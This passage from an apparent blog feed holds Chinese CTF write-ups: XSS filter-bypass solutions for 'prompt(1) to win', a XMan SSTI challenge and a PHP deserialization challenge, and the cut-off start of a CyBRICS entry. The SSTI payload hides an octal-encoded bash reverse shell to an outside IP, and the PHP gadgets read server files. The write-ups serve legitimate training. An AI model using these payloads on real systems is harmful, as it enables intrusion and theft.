class="string">&#x27;&#123;&quot;action&quot;:&quot;login&quot;,&quot;message&quot;:&quot;Welcome back, &#x27;</span> + memberName + <span class="string">&#x27;.&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// directly &quot;parse&quot; data in script context</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    var data = &#x27;</span> + dataString + <span class="string">&#x27;;          \n\</span></span><br><span class="line"><span class="string">    if (data.action === &quot;login&quot;)            \n\</span></span><br><span class="line"><span class="string">        document.write(data.message)        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小 trick ，利用字母操作符构造 <code>(prompt(1)) in &quot;.&quot;</code> ，虽然会报错，但是仍可以弹窗。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817171942102.png"></p><p>由于 js 定义对象时同一属性名的会先取后面的，所以可以利用这个 trick 实现 XSS。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817172250539.png"></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;(prompt(1))in&quot;</span><br></pre></td></tr></table></figure><hr><h2 id="0xC"><a href="#0xC" class="headerlink" title="0xC"></a>0xC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">&#x27;alert&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关用到三个函数。</p><blockquote><p>parseInt() // 可以将字符串通过进制转换为数字</p><p>toString() // 可以将数字通过进制转换回字符串</p><p>eval() // 可以将字符串当作正常语句执行</p></blockquote><p>直接给出测试</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817173413085.png"></p><p>payload: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(630038579..toString(30))(1) &#x3D;&#x3D;&gt; prompt(1)</span><br></pre></td></tr></table></figure><hr><h2 id="0xD"><a href="#0xD" class="headerlink" title="0xD"></a>0xD</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like &#123;&quot;source&quot;:&quot;http://sandbox.prompt.ml/PROMPT.JPG&quot;&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">&#x27;http://placehold.it/350x150&#x27;</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off &quot;</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;img src=&quot;&#123;&#123;source&#125;&#125;&quot;&gt;&#x27;</span>.replace(<span class="string">&#x27;&#123;&#123;source&#125;&#125;&#x27;</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid image data.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关有两个知识点</p><ul><li><p>js 对象的默认属性 <code>__proto__</code></p></li><li><p>js 的 replace 字符串特殊替换模式</p><p>首先是 js 对象的默认属性</p></li></ul><blockquote><p>每个对象都会在其内部初始化一个属性，就是<code>__proto__</code>，当我们访问对象的属性时，如果对象内部不存在这个属性，那么就会去<code>__proto__</code>里面找这个属性，这个<code>__proto__</code>又会有自己的<code>__proto__</code>，一直这样找下去。</p></blockquote><p>上测试！！</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817200920171.png"></p><p>所以当题目 <code>delete config.source</code>时，后面用到的 <code>config.source</code>  就是 <code>__proto__</code> 属性里的，这样就可控了。</p><p>然后是 js 的 replace 字符串特殊替换模式，主要看这个，或者<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#description">直接去网站看</a>。</p><table><thead><tr><th align="left">Pattern</th><th align="left">Inserts</th></tr></thead><tbody><tr><td align="left"><strong>$$</strong></td><td align="left">Inserts a <code>&quot;$&quot;</code>.</td></tr><tr><td align="left"><strong>$&amp;</strong></td><td align="left">Inserts the matched substring.</td></tr><tr><td align="left"><strong>$`</strong></td><td align="left">Inserts the portion of the string that precedes the matched substring.</td></tr><tr><td align="left"><strong>$‘</strong></td><td align="left">Inserts the portion of the string that follows the matched substring.</td></tr><tr><td align="left"><strong>$n</strong></td><td align="left">Where <code>n</code> is a positive integer less than 100, inserts the <code>n</code>th parenthesized submatch string, provided the first argument was a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp"><code>RegExp</code></a> object. Note that this is <code>1</code>-indexed. If a group <code>n</code> is not present (e.g., if group is 3), it will be replaced as a literal (e.g., <code>$3</code>).</td></tr><tr><td align="left"><strong>$&lt;Name&gt;</strong></td><td align="left">Where <code>Name</code> is a capturing group name. If the group is not in the match, or not in the regular expression, or if a string was passed as the first argument to <code>replace</code> instead of a regular expression, this resolves to a literal (e.g., <code>$&lt;Name&gt;</code>). Only available in browser versions supporting named capturing groups.</td></tr></tbody></table><p>直接上测试比较好理解点。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817201818379.png"></p><p>这样就可以做到既保留了 <code>&lt;img</code> 标签，又可以控制输入，这样就可以做到XSS了。</p><p>直接上payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;source&quot;:&#123;&#125;,&quot;__proto__&quot;:&#123;&quot;source&quot;:&quot;$&#96;onerror&#x3D;prompt(1)&gt;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="0xE"><a href="#0xE" class="headerlink" title="0xE"></a>0xE</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></span><br><span class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></span><br><span class="line">    <span class="comment">// too lazy to convert them back in lower case</span></span><br><span class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\/\/|\w+:/g</span>, <span class="string">&#x27;data:&#x27;</span>);</span><br><span class="line">    <span class="comment">// miscellaneous filtering</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个 replace 是将 <code>//</code> 或 <code>(任意字母数字):</code> 替换为 <code>data:</code>。</p><p>第二个 replace 是将 <strong>\</strong> 、 <strong>&amp;</strong> 、<strong>+</strong> 、<strong>%</strong> 和空白字符替换为 _____ 。</p><p>又因为有 toUpperCase() 在，所以注入 XSS 是不大好搞的，尝试引用外部脚本。</p><p>尝试了下，把我自己的服务器放上去拿不到全大写字母加数字的 base64 编码，就先放 payload 在这了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;IFRAME&#x2F;SRC&#x3D;&quot;x:text&#x2F;html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4&#x3D;</span><br></pre></td></tr></table></figure><hr><h2 id="0xF"><a href="#0xF" class="headerlink" title="0xF"></a>0xF</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;    </span><br><span class="line"><span class="comment">// sort of spoiler of level 7    </span></span><br><span class="line">input = input.replace(<span class="regexp">/\*/g</span>, <span class="string">&#x27;&#x27;</span>);    </span><br><span class="line"><span class="comment">// pass in something like dog#cat#bird#mouse...    </span></span><br><span class="line"><span class="keyword">var</span> segments = input.split(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title, index</span>) </span>&#123;        </span><br><span class="line"><span class="comment">// title can only contain 15 characters        </span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&lt;p class=&quot;comment&quot; title=&quot;&#x27;</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">&#x27;&quot; data-comment=\&#x27;&#123;&quot;id&quot;:&#x27;</span> + index + <span class="string">&#x27;&#125;\&#x27;&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;).join(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关虽然把 <code>*</code> 替换掉了，但是可以利用 <code>&lt;svg&gt;</code> 标签去使用 <code>&lt;!-- --&gt;</code>替代多行注释。</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;);&lt;!--#--&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;&quot;&gt;&lt;svg&gt;&lt;!--&quot; data-comment&#x3D;&#39;&#123;&quot;id&quot;:0&#125;&#39;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;--&gt;&lt;script&gt;&lt;!--&quot; data-comment&#x3D;&#39;&#123;&quot;id&quot;:1&#125;&#39;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;--&gt;prompt(1&lt;!--&quot; data-comment&#x3D;&#39;&#123;&quot;id&quot;:2&#125;&#39;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;--&gt;);&lt;!--&quot; data-comment&#x3D;&#39;&#123;&quot;id&quot;:3&#125;&#39;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;--&gt;&lt;&#x2F;script&gt;&quot; data-comment&#x3D;&#39;&#123;&quot;id&quot;:4&#125;&#39;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>写完这个靶场算是多了解了点 XSS(有点刚学 RCE的感觉¿</p><p>但是感觉接触的还不够，只是些绕过过滤什么的，最主要的利用 拿shell 弹shell? 应该是可以的，目前还没遇到过，还是得多练练。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;prompt-1-to-win-XSS靶场练习&quot;&gt;&lt;a href=&quot;#prompt-1-to-win-XSS靶场练习&quot; class=&quot;headerlink&quot; title=&quot;prompt(1) to win - XSS靶场练习&quot;&gt;&lt;/a&gt;prompt(1) to w</summary>
      
    
    
    
    <category term="Web" scheme="https://rossweisse.github.io/categories/Web/"/>
    
    
    <category term="CTF" scheme="https://rossweisse.github.io/tags/CTF/"/>
    
    <category term="XSS" scheme="https://rossweisse.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>第五届XMan选拔赛</title>
    <link href="https://rossweisse.github.io/2021/08/07/WriteUp/%E7%AC%AC%E4%BA%94%E5%B1%8AXMan%E9%80%89%E6%8B%94%E8%B5%9B/"/>
    <id>https://rossweisse.github.io/2021/08/07/WriteUp/%E7%AC%AC%E4%BA%94%E5%B1%8AXMan%E9%80%89%E6%8B%94%E8%B5%9B/</id>
    <published>2021-08-07T11:28:59.000Z</published>
    <updated>2021-08-07T11:30:27.138Z</updated>
    
    <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>基础题</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806120716307.png"></p><blockquote><p>flag{you_are_great!!!}</p></blockquote><h2 id="easyssti"><a href="#easyssti" class="headerlink" title="easyssti"></a>easyssti</h2><h3 id="ssti弹shell"><a href="#ssti弹shell" class="headerlink" title="ssti弹shell"></a>ssti弹shell</h3><p>ssti，主要考点是如何闭合。</p><p>测试发现<code>&#123;%print(1)%&#125;</code>成功返回。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806120923584.png"></p><p>__globals__查看当前位置的全部模块，方法和全局变量。</p><blockquote><p>name=%7B%25print((lipsum|attr(“__globals__“)))%25%7D</p></blockquote><p>values()查找可利用模块。</p><blockquote><p>name=%7B%25print((lipsum|attr(“__globals__“)).values()[18].values()[134])%25%7D</p></blockquote><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806121618333.png"></p><p>利用eval弹shell，使用八进制绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=%7B%25print((lipsum|attr(<span class="string">&quot;__globals__&quot;</span>)).values()[<span class="number">18</span>].values()[<span class="number">134</span>](<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\142\141\163\150\40\55\143\40\42\142\141\163\150\40\55\151\40\76\46\40\57\144\145\166\57\164\143\160\57\61\61\66\56\66\62\56\62\64\63\56\62\63\61\57\61\62\63\64\40\60\76\46\61\42\47\51\56\162\141\145\144\50\51&quot;</span>))%<span class="number">25</span>%7D</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806130713332.png"></p><p>拿到flag</p><blockquote><p>flag{zPkb3tzUW8m0KuSfPoPqgSU37I4ui2hZ}</p></blockquote><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><p>题目直接给出源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;Hel&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;xctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> Filter;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;what?Really?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hel</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;Hello bro, I guess you are a lazy &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> XMAN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出来是php反序列化题。</p><p>可利用点只有<code>echo new  $this-&gt;class ($this-&gt;para);</code>。</p><p>应该是利用php原生类进行文件读取。</p><p>利用FilessystemIterator类查看目录文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;FilesystemIterator&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;./&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> XMAN();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806122559447.png"></p><p>拿到了flag文件名。</p><p>利用SplFileObject原生类查看文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;./xxxXXXmMManNNn/f1a4.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> XMAN();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806122723103.png"></p><p>拿到flag。</p><blockquote><p>flag{928erf51ab894a64f7865cf3c2128b34}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;基础题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/R1ta_Violet/blogimg/raw/master/</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://rossweisse.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CyBRICS2021部分WriteUp</title>
    <link href="https://rossweisse.github.io/2021/08/03/WriteUp/CyBRICS2021/"/>
    <id>https://rossweisse.github.io/2021/08/03/WriteUp/CyBRICS2021/</id>
    <published>2021-08-03T09:21:27.000Z</published>
    <updated>2021-08-03T09:23:10.414Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Ad-NetWork"><a href="#Ad-NetWork" class="headerlink" title="Ad NetWork"></a>Ad NetWork</h3><h4 id="重定向套娃"><a href="#重定向套娃" class="headerlink" title="重定向套娃"></a>重定向套娃</h4><p>究极无敌有点烦之重定向套娃，写个脚本让它自己跑算了，用curl会舒服点。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://dream.adnetwork-cybrics2021.ctf.su/bit-wait-admit-artist-deal/might-inside-toward-suddenly-watch/rich-outside-arrive/character-possible-easy&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span 